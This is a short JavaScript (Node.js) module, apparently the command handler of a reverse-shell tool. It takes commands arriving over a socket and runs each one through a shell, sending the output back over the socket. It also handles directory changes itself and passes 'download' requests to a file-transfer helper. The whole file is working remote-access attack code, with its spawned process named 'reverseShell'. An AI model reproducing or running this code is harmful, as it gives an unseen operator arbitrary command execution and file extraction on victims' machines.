import {spawn} from 'child_process'
import {chdir} from 'process'
import download from './download.mjs'

function commandExecuter(command,socket) {
  if(command.slice(0,1)[0] === 'cd' && command.length >= 2) {
    chdir(command.slice(1,command.length)[0])
  }
  if(command.slice(0,1)[0] === 'download') {
    download(command.slice(1,command.length)[0],socket)
  }
  const reverseShell = spawn(command.slice(0,1)[0], command.slice(1,command.length),{shell:true})
  reverseShell.stdout.on('data', chunk => socket.write(chunk.toString()))

}

export default commandExecuter